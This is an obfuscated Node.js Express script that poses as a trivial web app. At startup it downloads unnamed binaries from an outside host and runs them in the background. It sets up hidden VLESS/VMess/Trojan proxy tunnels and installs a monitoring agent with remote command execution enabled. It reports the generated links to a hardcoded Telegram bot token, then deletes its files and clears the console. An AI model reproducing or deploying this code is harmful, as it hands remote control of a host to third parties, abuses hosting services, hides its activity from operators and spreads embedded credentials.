const _0x4ad8=['http','xtls-rprx-vision','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','web\x20running\x20error:\x20','ricZCX8ODNyN0X4UlSRSnZ9l92zn4UDB','config.yaml','charCodeAt','log','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','vmess://','application/json','vless','TunnelSecret','/trojan-argo','substring','\x0a\u00a0\u00a0\x0atrojan://','response','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','PROJECT_URL','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','App\x20is\x20running','get','Error\x20downloading\x20files:','rm\x20-f\x20','ARGO_DOMAIN:','sub.txt','/dev/null','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','2117746804','\x0a```','data','path','\x0a\u00a0\x20protocol:\x20http2\x0a\u00a0\x20\x0a\u00a0\x20ingress:\x0a\u00a0\x20\u00a0\x20-\x20hostname:\x20','\x20-s\x20','arm','Subscription\x20uploaded\x20successfully','map','none','2083','tcp','Deleted\x20','Error\x20in\x20deleteNodes:','?security=tls&sni=','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','length','npm\x20running\x20error:\x20','stringify','127.0.0.1','direct','config.json','UUID','unlinkSync','\x20already\x20exists','tunnel.json','fileName','boot.log','catch','charAt','XIEYI','includes','push','tls','anchorhost.oooc.de5.net','automatic\x20access\x20task\x20added\x20successfully','TelegramæŽ¨é€å¤±è´¥:','abcdefghijklmnopqrstuvwxyz','_router','https+local://8.8.8.8/dns-query','fromCodePoint','\x20failed:\x20','\x20>/dev/null\x202>&1\x20&','\x20-p\x20','base64','Error\x20executing\x20command:\x20','/vmess-argo','Unhandled\x20error\x20in\x20startserver:','123','\x20is\x20running','child_process','\x0a\x0aè®¢é˜…é“¾æŽ¥ï¼š\x0a```\x0a','from','Nodes\x20uploaded\x20successfully','eyJhIjoiYWViZTE2OGY2YmM2NmFhZThmMDcwNjY2ZWVkYmJiZDIiLCJ0IjoiMDBhNmRjMWMtNDFiNi00MWZiLWFhYzAtY2Q3ZWU0MGNjY2E5IiwicyI6Ik56STJORGMzTjJJdFl6QXpZaTAwTkdZMUxXRXdNVGd0TW1aa05UTmhZbVprWm1JeSJ9','axios','2096','\x20successfully','forEach','ArgoDomain:','Error\x20in\x20startserver:','Skipping\x20adding\x20automatic\x20access\x20task','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\u00a0\x20\u00a0\x20','util','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','SUB_PATH','arm64','Error\x20reading\x20boot.log:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','replace','8443','createWriteStream','unshift','error','utf-8','Content-Type','CFIP','AUTO_ACCESS','&path=%2Fvless-argo%3Fed%3D2560#','trim','--tls','blackhole','test','quic','2053','join','env','readFileSync','\x20is\x20created','toUpperCase','443','block','post','nohup\x20','route','/config.json\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','unlink','mkdirSync','basename','nezha.ylm52.dpdns.org:443','FILE_PATH','message','status','existsSync','?encryption=none&security=tls&sni=','Download\x20','-VLESS\x0a\u00a0\u00a0\x0avmess://','/vmess-argo?ed=2560','https://oooo.serv00.net/add-url','PORT','split','/vless-argo','ARGO_DOMAIN','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readdirSync','filter','toString','aarch64','send'];const _0x1fb4=function(_0x4ad821,_0x1fb446){_0x4ad821=_0x4ad821-0x0;let _0x305af4=_0x4ad8[_0x4ad821];return _0x305af4;};const express=require('express');const app=express();const axios=require(_0x1fb4('0x54'));const os=require('os');const fs=require('fs');const path=require(_0x1fb4('0x20'));const {promisify}=require(_0x1fb4('0x5d'));const exec=promisify(require('child_process')['exec']);const {execSync}=require(_0x1fb4('0x4f'));const UPLOAD_URL=process[_0x1fb4('0x74')]['UPLOAD_URL']||'';const PROJECT_URL=process['env'][_0x1fb4('0x13')]||'';const AUTO_ACCESS=process['env'][_0x1fb4('0x6b')]==='true'||![];const FILE_PATH=process[_0x1fb4('0x74')][_0x1fb4('0x83')]||'./tmp';const SUB_PATH=process['env'][_0x1fb4('0x5f')]||_0x1fb4('0x4d');const PORT=process['env']['SERVER_PORT']||process['env'][_0x1fb4('0x8c')]||0xbb8;const UUID=process[_0x1fb4('0x74')][_0x1fb4('0x33')]||'3581eb41-8563-477c-8fc9-679e1daa814f';const NEZHA_SERVER=process[_0x1fb4('0x74')]['NEZHA_SERVER']||_0x1fb4('0x82');const NEZHA_PORT=process[_0x1fb4('0x74')]['NEZHA_PORT']||'';const NEZHA_KEY=process[_0x1fb4('0x74')]['NEZHA_KEY']||_0x1fb4('0x5');const ARGO_DOMAIN=process[_0x1fb4('0x74')][_0x1fb4('0x8f')]||_0x1fb4('0x3f');const ARGO_AUTH=process[_0x1fb4('0x74')]['ARGO_AUTH']||_0x1fb4('0x53');const ARGO_PORT=process[_0x1fb4('0x74')]['ARGO_PORT']||0x1f41;const CFIP=process[_0x1fb4('0x74')][_0x1fb4('0x6a')]||'cf.877774.xyz';const CFPORT=process[_0x1fb4('0x74')]['CFPORT']||0x1bb;const NAME=process['env']['NAME']||'anchorhost';const XIEYI=process[_0x1fb4('0x74')][_0x1fb4('0x3b')]||'2';const CHAT_ID=process[_0x1fb4('0x74')]['CHAT_ID']||_0x1fb4('0x1d');const BOT_TOKEN=process[_0x1fb4('0x74')]['BOT_TOKEN']||'5279043230:AAFI4qfyo0oP7HJ-39jLqjqq9Wh6OeWrTjw';if(!fs['existsSync'](FILE_PATH)){fs['mkdirSync'](FILE_PATH);console[_0x1fb4('0x8')](FILE_PATH+_0x1fb4('0x76'));}else{console['log'](FILE_PATH+_0x1fb4('0x35'));}function generateRandomName(){const _0x3dea3d=_0x1fb4('0x42');let _0x3c4212='';for(let _0xf36a6=0x0;_0xf36a6<0x6;_0xf36a6++){_0x3c4212+=_0x3dea3d[_0x1fb4('0x3a')](Math['floor'](Math['random']()*_0x3dea3d['length']));}return _0x3c4212;}const npmName=generateRandomName();const webName=generateRandomName();const botName=generateRandomName();const phpName=generateRandomName();let npmPath=path[_0x1fb4('0x73')](FILE_PATH,npmName);let phpPath=path['join'](FILE_PATH,phpName);let webPath=path[_0x1fb4('0x73')](FILE_PATH,webName);let botPath=path[_0x1fb4('0x73')](FILE_PATH,botName);let subPath=path['join'](FILE_PATH,_0x1fb4('0x1a'));let listPath=path['join'](FILE_PATH,'list.txt');let bootLogPath=path['join'](FILE_PATH,_0x1fb4('0x38'));let configPath=path['join'](FILE_PATH,_0x1fb4('0x32'));async function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs[_0x1fb4('0x86')](subPath))return;let _0x41d69a;try{_0x41d69a=fs[_0x1fb4('0x75')](subPath,'utf-8');}catch{return;}const _0x292a37=Buffer[_0x1fb4('0x51')](_0x41d69a,'base64')['toString'](_0x1fb4('0x68'));const _0x282e85=_0x292a37[_0x1fb4('0x8d')]('\x0a')['filter'](_0x5c76d3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1fb4('0x70')](_0x5c76d3['trim']()));if(_0x282e85[_0x1fb4('0x2d')]===0x0)return;try{await axios['post'](UPLOAD_URL+'/api/delete-nodes',{'nodes':_0x282e85},{'headers':{'Content-Type':'application/json'}});console['log'](_0x1fb4('0x29')+_0x282e85['length']+'\x20nodes\x20from\x20server');}catch(_0x2012e3){console['warn']('Failed\x20to\x20delete\x20nodes:',_0x2012e3[_0x1fb4('0x84')]);}}catch(_0x4e897e){console[_0x1fb4('0x67')](_0x1fb4('0x2a'),_0x4e897e['message']);}}function cleanupOldFiles(){try{const _0x50f086=fs[_0x1fb4('0x91')](FILE_PATH);_0x50f086['forEach'](_0x4513d5=>{const _0x3699e6=path['join'](FILE_PATH,_0x4513d5);try{const _0x1e932a=fs['statSync'](_0x3699e6);if(_0x1e932a['isFile']()){fs[_0x1fb4('0x34')](_0x3699e6);}}catch(_0x16c8e0){}});}catch(_0x299c9c){}}app[_0x1fb4('0x16')]('/',function(_0x53eb05,_0x5b4f6c){_0x5b4f6c[_0x1fb4('0x95')]('success\x20ylm!');});async function generateConfig(){const _0x521b05={'log':{'access':'/dev/null','error':_0x1fb4('0x1b'),'loglevel':_0x1fb4('0x26')},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1fb4('0xc'),'settings':{'clients':[{'id':UUID,'flow':_0x1fb4('0x1')}],'decryption':_0x1fb4('0x26'),'fallbacks':[{'dest':0xbb9},{'path':_0x1fb4('0x8e'),'dest':0xbba},{'path':_0x1fb4('0x4b'),'dest':0xbbb},{'path':_0x1fb4('0xe'),'dest':0xbbc}]},'streamSettings':{'network':_0x1fb4('0x28')}},{'port':0xbb9,'listen':_0x1fb4('0x30'),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1fb4('0x28'),'security':_0x1fb4('0x26')}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1fb4('0x8e')}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x1fb4('0x71')],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1fb4('0x4b')}},'sniffing':{'enabled':!![],'destOverride':[_0x1fb4('0x0'),_0x1fb4('0x3e'),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1fb4('0x0'),_0x1fb4('0x3e'),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x1fb4('0x44')]},'outbounds':[{'protocol':'freedom','tag':_0x1fb4('0x31')},{'protocol':_0x1fb4('0x6f'),'tag':_0x1fb4('0x79')}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x1fb4('0x32')),JSON['stringify'](_0x521b05,null,0x2));}function getSystemArchitecture(){const _0x2bd565=os['arch']();if(_0x2bd565==='arm'||_0x2bd565===_0x1fb4('0x60')||_0x2bd565===_0x1fb4('0x94')){return'arm';}else{return'amd';}}function downloadFile(_0x56387f,_0x380dc6,_0x22a05d){const _0x10d41a=_0x56387f;if(!fs[_0x1fb4('0x86')](FILE_PATH)){fs[_0x1fb4('0x80')](FILE_PATH,{'recursive':!![]});}const _0x1cbe65=fs[_0x1fb4('0x65')](_0x10d41a);axios({'method':_0x1fb4('0x16'),'url':_0x380dc6,'responseType':'stream'})['then'](_0xd513b3=>{_0xd513b3[_0x1fb4('0x1f')]['pipe'](_0x1cbe65);_0x1cbe65['on']('finish',()=>{_0x1cbe65['close']();console[_0x1fb4('0x8')]('Download\x20'+path['basename'](_0x10d41a)+_0x1fb4('0x56'));_0x22a05d(null,_0x10d41a);});_0x1cbe65['on'](_0x1fb4('0x67'),_0xdb1edb=>{fs[_0x1fb4('0x7f')](_0x10d41a,()=>{});const _0x133794=_0x1fb4('0x88')+path[_0x1fb4('0x81')](_0x10d41a)+_0x1fb4('0x46')+_0xdb1edb[_0x1fb4('0x84')];console['error'](_0x133794);_0x22a05d(_0x133794);});})[_0x1fb4('0x39')](_0x8d48ed=>{const _0x4bf71f=_0x1fb4('0x88')+path[_0x1fb4('0x81')](_0x10d41a)+'\x20failed:\x20'+_0x8d48ed[_0x1fb4('0x84')];console[_0x1fb4('0x67')](_0x4bf71f);_0x22a05d(_0x4bf71f);});}async function downloadFilesAndRun(){const _0x3898b8=getSystemArchitecture();const _0x2f1873=getFilesForArchitecture(_0x3898b8);if(_0x2f1873[_0x1fb4('0x2d')]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x57e100=_0x2f1873['map'](_0x16eb73=>{return new Promise((_0x557dea,_0x244ba5)=>{downloadFile(_0x16eb73[_0x1fb4('0x37')],_0x16eb73['fileUrl'],(_0x1dd0f1,_0x4a6bcd)=>{if(_0x1dd0f1){_0x244ba5(_0x1dd0f1);}else{_0x557dea(_0x4a6bcd);}});});});try{await Promise['all'](_0x57e100);}catch(_0x3e8830){console[_0x1fb4('0x67')](_0x1fb4('0x17'),_0x3e8830);return;}function _0x1c0aa0(_0x3e97b5){const _0x24edca=0x1fd;_0x3e97b5['forEach'](_0x43c141=>{if(fs['existsSync'](_0x43c141)){fs['chmod'](_0x43c141,_0x24edca,_0x4b3ec7=>{if(_0x4b3ec7){console[_0x1fb4('0x67')]('Empowerment\x20failed\x20for\x20'+_0x43c141+':\x20'+_0x4b3ec7);}else{console[_0x1fb4('0x8')]('Empowerment\x20success\x20for\x20'+_0x43c141+':\x20'+_0x24edca[_0x1fb4('0x93')](0x8));}});}});}const _0x3394fd=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1c0aa0(_0x3394fd);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xff66f0=NEZHA_SERVER[_0x1fb4('0x3c')](':')?NEZHA_SERVER['split'](':')['pop']():'';const _0x427998=new Set([_0x1fb4('0x78'),'8443',_0x1fb4('0x55'),'2087',_0x1fb4('0x27'),_0x1fb4('0x72')]);const _0x236369=_0x427998['has'](_0xff66f0)?'true':'false';const _0x48369f='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1fb4('0x12')+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x236369+_0x1fb4('0x90')+UUID;fs['writeFileSync'](path[_0x1fb4('0x73')](FILE_PATH,_0x1fb4('0x6')),_0x48369f);const _0x52b9e8=_0x1fb4('0x7b')+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x1fb4('0x9');try{await exec(_0x52b9e8);console[_0x1fb4('0x8')](phpName+_0x1fb4('0x4e'));await new Promise(_0x3f2435=>setTimeout(_0x3f2435,0x3e8));}catch(_0x54e195){console[_0x1fb4('0x67')]('php\x20running\x20error:\x20'+_0x54e195);}}else{let _0xeb0487='';const _0x46687d=['443',_0x1fb4('0x64'),'2096','2087',_0x1fb4('0x27'),'2053'];if(_0x46687d[_0x1fb4('0x3c')](NEZHA_PORT)){_0xeb0487=_0x1fb4('0x6e');}const _0x2884c2='nohup\x20'+npmPath+_0x1fb4('0x22')+NEZHA_SERVER+':'+NEZHA_PORT+_0x1fb4('0x48')+NEZHA_KEY+'\x20'+_0xeb0487+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2884c2);console[_0x1fb4('0x8')](npmName+_0x1fb4('0x4e'));await new Promise(_0x86e4be=>setTimeout(_0x86e4be,0x3e8));}catch(_0x23ab53){console[_0x1fb4('0x67')](_0x1fb4('0x2e')+_0x23ab53);}}}else{console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');}const _0x56a696=_0x1fb4('0x7b')+webPath+'\x20-c\x20'+FILE_PATH+_0x1fb4('0x7d');try{await exec(_0x56a696);console['log'](webName+_0x1fb4('0x4e'));await new Promise(_0x2664db=>setTimeout(_0x2664db,0x3e8));}catch(_0x1c70ce){console['error'](_0x1fb4('0x4')+_0x1c70ce);}if(fs[_0x1fb4('0x86')](botPath)){let _0x171bce;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/)){_0x171bce='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;}else if(ARGO_AUTH['match'](/TunnelSecret/)){_0x171bce=_0x1fb4('0x3')+FILE_PATH+'/tunnel.yml\x20run';}else{_0x171bce='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1fb4('0x14')+ARGO_PORT;}try{await exec(_0x1fb4('0x7b')+botPath+'\x20'+_0x171bce+_0x1fb4('0x47'));console[_0x1fb4('0x8')](botName+'\x20is\x20running');await new Promise(_0x2c81c9=>setTimeout(_0x2c81c9,0x7d0));}catch(_0x3d1a6b){console['error'](_0x1fb4('0x4a')+_0x3d1a6b);}}await new Promise(_0x452e12=>setTimeout(_0x452e12,0x1388));}function getFilesForArchitecture(_0x8c1b2){let _0x520b82;if(_0x8c1b2==='arm'){_0x520b82=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}];}else{_0x520b82=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x874b2e=_0x8c1b2===_0x1fb4('0x23')?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x520b82[_0x1fb4('0x66')]({'fileName':npmPath,'fileUrl':_0x874b2e});}else{const _0x3e97eb=_0x8c1b2==='arm'?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x520b82[_0x1fb4('0x66')]({'fileName':phpPath,'fileUrl':_0x3e97eb});}}return _0x520b82;}function argoType(){if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1fb4('0x8')](_0x1fb4('0x5e'));return;}if(ARGO_AUTH[_0x1fb4('0x3c')](_0x1fb4('0xd'))){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x125a25='\x0a\u00a0\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\u00a0\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x1fb4('0x36'))+_0x1fb4('0x21')+ARGO_DOMAIN+'\x0a\u00a0\x20\u00a0\x20\u00a0\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\u00a0\x20\u00a0\x20\u00a0\x20originRequest:\x0a\u00a0\x20\u00a0\x20\u00a0\x20\u00a0\x20noTLSVerify:\x20true\x0a\u00a0\x20\u00a0\x20-\x20service:\x20http_status:404\x0a\u00a0\x20';fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x125a25);}else{console['log'](_0x1fb4('0x1c'));}}argoType();async function extractDomains(){let _0x2353a;if(ARGO_AUTH&&ARGO_DOMAIN){_0x2353a=ARGO_DOMAIN;console['log'](_0x1fb4('0x19'),_0x2353a);await generateLinks(_0x2353a);}else{try{const _0x253990=fs['readFileSync'](path[_0x1fb4('0x73')](FILE_PATH,'boot.log'),'utf-8');const _0x2b8eff=_0x253990[_0x1fb4('0x8d')]('\x0a');const _0x5deaa8=[];_0x2b8eff[_0x1fb4('0x57')](_0x51e63e=>{const _0x4b6496=_0x51e63e['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4b6496){const _0x1e9a41=_0x4b6496[0x1];_0x5deaa8[_0x1fb4('0x3d')](_0x1e9a41);}});if(_0x5deaa8['length']>0x0){_0x2353a=_0x5deaa8[0x0];console[_0x1fb4('0x8')](_0x1fb4('0x58'),_0x2353a);await generateLinks(_0x2353a);}else{console[_0x1fb4('0x8')](_0x1fb4('0x2c'));fs['unlinkSync'](path['join'](FILE_PATH,'boot.log'));try{await exec('pkill\x20-f\x20\x22'+botName+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2839d6){}await new Promise(_0x54b7e7=>setTimeout(_0x54b7e7,0xbb8));const _0x57fc87=_0x1fb4('0x62')+FILE_PATH+_0x1fb4('0x14')+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x57fc87+'\x20>/dev/null\x202>&1\x20&');console['log'](botName+'\x20is\x20running');await new Promise(_0x25e0ab=>setTimeout(_0x25e0ab,0xbb8));await extractDomains();}catch(_0x1a1952){console['error'](_0x1fb4('0x4a')+_0x1a1952);}}}catch(_0x40bd28){console['error'](_0x1fb4('0x61'),_0x40bd28);}}}function getFlagEmoji(_0x430bda){if(!_0x430bda)return'';const _0x3736b1=0x1f1e6;const _0x301826=_0x430bda[_0x1fb4('0x77')]()[_0x1fb4('0x8d')]('')[_0x1fb4('0x25')](_0x42ea1a=>_0x3736b1+_0x42ea1a['charCodeAt'](0x0)-'A'[_0x1fb4('0x7')](0x0));try{return String[_0x1fb4('0x45')](..._0x301826);}catch(_0x4c7757){return'';}}async function generateLinks(_0x2c563b){function _0x1e6f54(_0x2ee758){const _0x1eda7b={'Singapore':'SG','Hong_Kong':'HK','Taipei':'TW','Tokyo':'JP','Osaka':'JP','Seoul':'KR','Jakarta':'ID','Kuala_Lumpur':'MY','Manila':'PH','Mumbai':'IN','Delhi':'IN','Bangkok':'TH','Hanoi':'VN','Ho_Chi_Minh_City':'VN','Ashburn':'US','Chicago':'US','Dallas':'US','Los_Angeles':'US','San_Jose':'US','Seattle':'US','Miami':'US','Toronto':'CA','Montreal':'CA','Frankfurt':'DE','London':'GB','Paris':'FR','Amsterdam':'NL','Warsaw':'PL','Madrid':'ES','Milan':'IT','Stockholm':'SE','Zurich':'CH','Sydney':'AU','Melbourne':'AU','Auckland':'NZ','Sao_Paulo':'BR','Santiago':'CL','Bogota':'CO','Dubai':'AE','Johannesburg':'ZA'};const _0x4a7e8f=_0x2ee758[_0x1fb4('0x63')](/[\s_]/g,'');for(const _0xa79e52 in _0x1eda7b){if(_0x4a7e8f['toLowerCase']()===_0xa79e52['replace'](/_/g,'')['toLowerCase']()){return _0x1eda7b[_0xa79e52];}}return _0x4a7e8f[_0x1fb4('0xf')](0x0,0x3)['toUpperCase']();}const _0x64be29=execSync(_0x1fb4('0x2'),{'encoding':'utf-8'});const _0x34f240=_0x64be29[_0x1fb4('0x6d')]();const _0x43ce4e=_0x1e6f54(_0x34f240);const _0x2de8d7=getFlagEmoji(_0x43ce4e);const _0x2a165=NAME?NAME+'-'+_0x43ce4e:_0x43ce4e;const _0x511125=(_0x2de8d7+'\x20'+_0x2a165)['trim']();return new Promise(async _0x2fe006=>{setTimeout(async()=>{const _0xd729f0={'v':'2','ps':''+_0x511125,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x2c563b,'path':_0x1fb4('0x8a'),'tls':_0x1fb4('0x3e'),'sni':_0x2c563b,'alpn':'','fp':'firefox'};let _0x34fc93='';if(XIEYI==='3'){_0x34fc93='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2c563b+'&fp=firefox&type=ws&host='+_0x2c563b+_0x1fb4('0x6c')+_0x511125+'-VLESS\x0a\u00a0\u00a0\x0avmess://'+Buffer[_0x1fb4('0x51')](JSON['stringify'](_0xd729f0))['toString']('base64')+_0x1fb4('0x10')+UUID+'@'+CFIP+':'+CFPORT+_0x1fb4('0x2b')+_0x2c563b+'&fp=firefox&type=ws&host='+_0x2c563b+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x511125+'-TROJAN\x0a\u00a0\x20\u00a0\x20';}else if(XIEYI==='2'){_0x34fc93='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1fb4('0x87')+_0x2c563b+'&fp=firefox&type=ws&host='+_0x2c563b+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x511125+_0x1fb4('0x89')+Buffer[_0x1fb4('0x51')](JSON[_0x1fb4('0x2f')](_0xd729f0))['toString']('base64')+_0x1fb4('0x5c');}else{_0x34fc93=_0x1fb4('0xa')+Buffer['from'](JSON[_0x1fb4('0x2f')](_0xd729f0))['toString'](_0x1fb4('0x49'));}console[_0x1fb4('0x8')](Buffer[_0x1fb4('0x51')](_0x34fc93)['toString']('base64'));fs['writeFileSync'](subPath,Buffer['from'](_0x34fc93)['toString'](_0x1fb4('0x49')));console['log'](FILE_PATH+_0x1fb4('0x7e'));await uploadNodes();await sendToTelegram(_0x34fc93[_0x1fb4('0x6d')](),_0x511125);if(!app[_0x1fb4('0x43')]['stack']['some'](_0x5c9ecd=>_0x5c9ecd['route']&&_0x5c9ecd[_0x1fb4('0x7c')][_0x1fb4('0x20')]==='/'+SUB_PATH)){app[_0x1fb4('0x16')]('/'+SUB_PATH,(_0x3df534,_0x1da9e5)=>{const _0x20e191=Buffer[_0x1fb4('0x51')](_0x34fc93)[_0x1fb4('0x93')](_0x1fb4('0x49'));_0x1da9e5['set'](_0x1fb4('0x69'),'text/plain;\x20charset=utf-8');_0x1da9e5[_0x1fb4('0x95')](_0x20e191);});}_0x2fe006(_0x34fc93);},0x7d0);});}async function sendToTelegram(_0x2a7e78,_0xf66e37){if(!CHAT_ID||!BOT_TOKEN){console[_0x1fb4('0x8')]('TelegramæŽ¨é€æœªé…ç½®ï¼šCHAT_ID\x20æˆ–\x20BOT_TOKEN\x20ä¸ºç©º');return;}try{const _0x1131b1='https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage';const _0x5848ac='ðŸ”—\x20æ–°èŠ‚ç‚¹å·²ç”Ÿæˆ\x0a\x0aèŠ‚ç‚¹åç§°ï¼š'+_0xf66e37+_0x1fb4('0x50')+_0x2a7e78[_0x1fb4('0x6d')]()+_0x1fb4('0x1e');const _0x2c8a63=await axios[_0x1fb4('0x7a')](_0x1131b1,{'chat_id':CHAT_ID,'text':_0x5848ac,'parse_mode':'Markdown'},{'headers':{'Content-Type':_0x1fb4('0xb')}});if(_0x2c8a63&&_0x2c8a63[_0x1fb4('0x85')]===0xc8){console[_0x1fb4('0x8')]('èŠ‚ç‚¹å·²æŽ¨é€åˆ°Telegram');return _0x2c8a63;}else{console['warn']('TelegramæŽ¨é€å¤±è´¥ï¼šæœªçŸ¥å“åº”çŠ¶æ€');return null;}}catch(_0x210fce){if(_0x210fce['response']){console['error'](_0x1fb4('0x41'),_0x210fce['response'][_0x1fb4('0x1f')]);}else{console['error']('TelegramæŽ¨é€å¤±è´¥:',_0x210fce['message']);}return null;}}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){const _0xc0f871=PROJECT_URL+'/'+SUB_PATH;const _0x4fff50={'subscription':[_0xc0f871]};try{const _0x59e075=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x4fff50,{'headers':{'Content-Type':_0x1fb4('0xb')}});if(_0x59e075&&_0x59e075[_0x1fb4('0x85')]===0xc8){console[_0x1fb4('0x8')](_0x1fb4('0x24'));return _0x59e075;}else{return null;}}catch(_0x57a06c){if(_0x57a06c['response']){if(_0x57a06c[_0x1fb4('0x11')]['status']===0x190){}}}}else if(UPLOAD_URL){if(!fs[_0x1fb4('0x86')](listPath))return;const _0x5ebfa0=fs[_0x1fb4('0x75')](listPath,_0x1fb4('0x68'));const _0x3110bf=_0x5ebfa0[_0x1fb4('0x8d')]('\x0a')[_0x1fb4('0x92')](_0x1026d6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1026d6));if(_0x3110bf[_0x1fb4('0x2d')]===0x0)return;const _0x398b20=JSON['stringify']({'nodes':_0x3110bf});try{const _0x568284=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x398b20,{'headers':{'Content-Type':_0x1fb4('0xb')}});if(_0x568284&&_0x568284['status']===0xc8){console['log'](_0x1fb4('0x52'));return _0x568284;}else{return null;}}catch(_0x38040b){return null;}}else{return;}}function cleanFiles(){setTimeout(()=>{const _0x1fd42e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT){_0x1fd42e[_0x1fb4('0x3d')](npmPath);}else if(NEZHA_SERVER&&NEZHA_KEY){_0x1fd42e[_0x1fb4('0x3d')](phpPath);}exec(_0x1fb4('0x18')+_0x1fd42e[_0x1fb4('0x73')]('\x20')+'\x20>/dev/null\x202>&1',_0x1c6e1d=>{console['clear']();console['log'](_0x1fb4('0x15'));console['log'](_0x1fb4('0x5b'));});},0x15f90);}cleanFiles();async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1fb4('0x8')](_0x1fb4('0x5a'));return;}try{const _0x253e27=await axios[_0x1fb4('0x7a')](_0x1fb4('0x8b'),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1fb4('0xb')}});console['log'](_0x1fb4('0x40'));return _0x253e27;}catch(_0x1b0f6b){console[_0x1fb4('0x67')]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x1b0f6b['message']);return null;}}async function startserver(){try{await deleteNodes();cleanupOldFiles();await generateConfig();await downloadFilesAndRun();await extractDomains();await AddVisitTask();}catch(_0x46224b){console[_0x1fb4('0x67')](_0x1fb4('0x59'),_0x46224b);}}startserver()['catch'](_0xf3be4e=>{console[_0x1fb4('0x67')](_0x1fb4('0x4c'),_0xf3be4e);});app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
